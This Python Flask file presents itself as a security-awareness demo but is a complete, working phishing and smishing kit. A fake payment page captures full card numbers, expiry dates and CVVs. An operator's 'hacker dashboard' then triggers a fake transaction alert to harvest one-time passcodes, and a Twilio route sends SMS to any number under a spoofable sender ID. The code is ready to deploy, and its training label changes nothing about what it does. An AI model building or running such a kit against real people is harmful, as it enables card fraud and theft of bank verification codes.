#!/usr/bin/env python3
"""
Combined Phishing & SMS Demo - For Security Awareness Training Only
Runs phishing demo on / and SMS sender on /sms
"""

from flask import Flask, render_template_string, render_template, request, jsonify, send_file, session, redirect, url_for
from flask_wtf.csrf import CSRFProtect
from twilio.rest import Client
from datetime import datetime, timedelta
from html import escape
from typing import Optional, Dict, Any, Callable
import os
import threading
import re

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY')
if not app.secret_key:
    raise ValueError("SECRET_KEY environment variable is required")

# Enable CSRF protection
csrf = CSRFProtect(app)

# Add security headers
@app.after_request
def after_request(response):
    response.headers.add('X-Content-Type-Options', 'nosniff')
    response.headers.add('X-Frame-Options', 'DENY')
    response.headers.add('X-XSS-Protection', '1; mode=block')
    return response

# Twilio credentials - required from environment
ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')
if not ACCOUNT_SID or not AUTH_TOKEN:
    raise ValueError("TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN environment variables are required")

DEFAULT_FROM = os.getenv('DEFAULT_FROM_NUMBER')
if not DEFAULT_FROM:
    raise ValueError("DEFAULT_FROM_NUMBER environment variable is required")

DEFAULT_SMS_MESSAGE = os.getenv('DEFAULT_SMS_MESSAGE')
if not DEFAULT_SMS_MESSAGE:
    raise ValueError("DEFAULT_SMS_MESSAGE environment variable is required")
# Convert literal \n to actual newlines for proper text formatting
DEFAULT_SMS_MESSAGE = DEFAULT_SMS_MESSAGE.replace('\\n', '\n')

# Admin credentials - required from environment
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')
if not ADMIN_USERNAME or not ADMIN_PASSWORD:
    raise ValueError("ADMIN_USERNAME and ADMIN_PASSWORD environment variables are required")

# Track state for phishing demo with thread-safe access
_state_lock = threading.Lock()
_ready_for_alert = False
_captured_data: Dict[str, Optional[Dict[str, str]]] = {
    'card': None,
    'otp': None
}

def get_ready_for_alert() -> bool:
    """Thread-safe getter for ready_for_alert"""
    with _state_lock:
        return _ready_for_alert

def set_ready_for_alert(value: bool) -> None:
    """Thread-safe setter for ready_for_alert"""
    global _ready_for_alert
    with _state_lock:
        _ready_for_alert = value

def get_captured_data() -> Dict[str, Optional[Dict[str, str]]]:
    """Thread-safe getter for captured_data"""
    with _state_lock:
        return _captured_data.copy()

def set_card_data(data: Dict[str, str]) -> None:
    """Thread-safe setter for card data"""
    global _captured_data
    with _state_lock:
        _captured_data['card'] = data

def set_otp_data(data: Dict[str, str]) -> None:
    """Thread-safe setter for OTP data"""
    global _captured_data
    with _state_lock:
        _captured_data['otp'] = data

def clear_captured_data() -> None:
    """Thread-safe method to clear all captured data"""
    global _captured_data
    with _state_lock:
        _captured_data = {
            'card': None,
            'otp': None
        }

# Input validation functions
def validate_phone_number(phone: str) -> bool:
    """Validate phone number format (E.164 format or alphanumeric sender ID)"""
    # E.164: +[country code][number] up to 15 digits
    e164_pattern = r'^\+[1-9]\d{1,14}$'
    # Alphanumeric sender ID: 3-11 alphanumeric characters (Twilio format)
    alphanumeric_pattern = r'^[a-zA-Z0-9]{3,11}$'
    return bool(re.match(e164_pattern, phone) or re.match(alphanumeric_pattern, phone))

def validate_card_number(card: str) -> bool:
    """Validate card number (digits only, 13-19 length)"""
    digits = card.replace(' ', '')
    return digits.isdigit() and 13 <= len(digits) <= 19

def validate_cvv(cvv: str) -> bool:
    """Validate CVV (3-4 digits)"""
    return cvv.isdigit() and 3 <= len(cvv) <= 4

def validate_expiry(expiry: str) -> bool:
    """Validate expiry date format (MM/YY)"""
    pattern = r'^\d{2}/\d{2}$'
    return bool(re.match(pattern, expiry))

def validate_otp(otp: str) -> bool:
    """Validate OTP (6 digits)"""
    return otp.isdigit() and len(otp) == 6

def sanitize_string(value: str, max_length: int = 255) -> str:
    """Sanitize and truncate string input"""
    return escape(value.strip())[:max_length]

def is_authenticated() -> bool:
    """Check if user is authenticated"""
    return session.get('authenticated', False)

def require_auth(f: Callable) -> Callable:
    """Decorator to require authentication"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page for admin access"""
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            # Determine where to redirect based on referrer
            referrer = request.referrer or ''
            if '/sms' in referrer:
                return redirect(url_for('sms_sender'))
            else:
                return redirect(url_for('hacker_dashboard'))
        else:
            error = 'Invalid username or password'

    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    """Logout user"""
    session.pop('authenticated', None)
    return redirect(url_for('login'))

@app.route('/logo.png')
def serve_logo():
    """Serve the logo image"""
    return send_file('logo.png', mimetype='image/png')

@app.route('/', methods=['GET'])
def phishing_form():
    """Serve the fake payment form"""
    return render_template('phishing_form.html')

@app.route('/submit', methods=['POST'])
def submit_card():
    """Handle card submission"""
    try:
        set_ready_for_alert(False)

        # Get form data
        card_name = request.form.get('cardName', '').strip()
        card_number = request.form.get('cardNumber', '').replace(' ', '')
        expiry = request.form.get('expiry', '').strip()
        cvv = request.form.get('cvv', '').strip()

        # Validate inputs
        if not card_name or len(card_name) < 3 or len(card_name) > 100:
            return "Invalid cardholder name", 400

        if not validate_card_number(card_number):
            return "Invalid card number", 400

        if not validate_expiry(expiry):
            return "Invalid expiry date", 400

        if not validate_cvv(cvv):
            return "Invalid CVV", 400

        # Sanitize and store inputs
        captured = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'cardholder_name': sanitize_string(card_name, 100),
            'card_number': card_number,
            'expiry_date': expiry,
            'cvv': cvv
        }

        # Store for hacker dashboard
        set_card_data(captured)
    except Exception as e:
        # Log error but don't expose details to user
        app.logger.error(f"Error in submit_card: {str(e)}")
        return "An error occurred processing your request", 500

    return render_template('loading.html')

@app.route('/check_ready', methods=['GET', 'POST'])
def check_ready():
    """Check if ready to show alert"""
    return jsonify({'ready': get_ready_for_alert()})

@app.route('/hacker', methods=['GET'])
@require_auth
def hacker_dashboard():
    """Hacker control panel with SMS sending"""
    return render_template('hacker_dashboard.html', default_from=DEFAULT_FROM, default_sms_message=DEFAULT_SMS_MESSAGE)
@app.route('/hacker/data', methods=['GET'])
@require_auth
def hacker_data():
    """API endpoint for hacker dashboard data"""
    return jsonify(get_captured_data())

@app.route('/hacker/continue', methods=['POST'])
@require_auth
def hacker_continue():
    """API endpoint to continue victim flow"""
    set_ready_for_alert(True)
    return jsonify({'success': True})

@app.route('/hacker/clear', methods=['POST'])
@require_auth
def hacker_clear():
    """API endpoint to clear captured data and reset for new demo"""
    set_ready_for_alert(False)
    clear_captured_data()
    return jsonify({'success': True})

@app.route('/transaction_alert', methods=['GET'])
def transaction_alert():
    """Show transaction alert"""
    transaction_time = datetime.now() - timedelta(minutes=8)
    transaction_date = transaction_time.strftime('%d/%m/%Y')
    transaction_hour = transaction_time.strftime('%H:%M')

    return render_template('transaction_alert.html',
                         transaction_date=transaction_date,
                         transaction_hour=transaction_hour)

@app.route('/otp', methods=['GET'])
def otp_page():
    """Show OTP entry page"""
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify_otp():
    """Handle OTP verification"""
    try:
        otp = request.form.get('otp', '').strip()

        # Validate OTP
        if not validate_otp(otp):
            return "Invalid OTP code", 400

        # Store OTP with sanitization
        set_otp_data({
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'code': escape(otp)
        })

        # Calculate reference number from captured card data
        reference_number = "N/A"
        captured_data = get_captured_data()
        if captured_data.get('card'):
            try:
                # Extract card number and CVV (remove any non-digit characters)
                card_number = re.sub(r'\D', '', captured_data['card'].get('card_number', ''))
                cvv = re.sub(r'\D', '', captured_data['card'].get('cvv', ''))

                if card_number and cvv:
                    # Calculate: (card_number + cvv) % 900000000 + 1000000000
                    # Result will be a 10-digit number (1000000000-1899999999)
                    # Never starts with 0
                    card_int = int(card_number)
                    cvv_int = int(cvv)
                    reference_number = str(((card_int + cvv_int) % 900000000) + 1000000000)
            except (ValueError, ZeroDivisionError):
                reference_number = "N/A"
    except Exception as e:
        # Log error but don't expose details to user
        app.logger.error(f"Error in verify_otp: {str(e)}")
        return "An error occurred processing your request", 500

    return render_template('verification_success.html', reference_number=reference_number)

# SMS API Route
@app.route('/send', methods=['POST'])
@require_auth
def send_sms():
    """Send SMS via Twilio"""
    try:
        data = request.get_json()

        from_number = data.get('from', '').strip()
        to_number = data.get('to', '').strip()
        message_body = data.get('message', '').strip()

        # Validate required fields
        if not all([from_number, to_number, message_body]):
            return jsonify({'error': 'Missing required fields'}), 400

        # Validate phone numbers
        if not validate_phone_number(from_number):
            return jsonify({'error': 'Invalid "from" number format. Use E.164 format (e.g., +1234567890) or alphanumeric sender ID (e.g., Cal)'}), 400

        if not validate_phone_number(to_number):
            return jsonify({'error': 'Invalid "to" phone number format. Use E.164 format (e.g., +1234567890)'}), 400

        # Validate message length (Twilio limit is 1600 chars)
        if len(message_body) > 1600:
            return jsonify({'error': 'Message too long. Maximum 1600 characters.'}), 400

        if len(message_body) < 1:
            return jsonify({'error': 'Message cannot be empty'}), 400

        # Send SMS via Twilio
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )

        return jsonify({
            'success': True,
            'sid': message.sid,
            'status': message.status
        })

    except Exception as e:
        # Log the full error but return generic message
        app.logger.error(f"Error sending SMS: {str(e)}")
        return jsonify({'error': 'Failed to send SMS. Please check your credentials and try again.'}), 500

if __name__ == '__main__':
    # Get port from environment variable (required)
    port_str = os.getenv('PORT')
    if not port_str:
        raise ValueError("PORT environment variable is required")

    try:
        port = int(port_str)
    except ValueError as e:
        raise ValueError(f"PORT must be a valid integer, got: {port_str}") from None

    # Get debug mode from environment variable (required)
    debug_str = os.getenv('FLASK_DEBUG')
    if not debug_str:
        raise ValueError("FLASK_DEBUG environment variable is required (set to 'true' or 'false')")

    debug = debug_str.lower() == 'true'

    app.run(debug=debug, host='0.0.0.0', port=port)
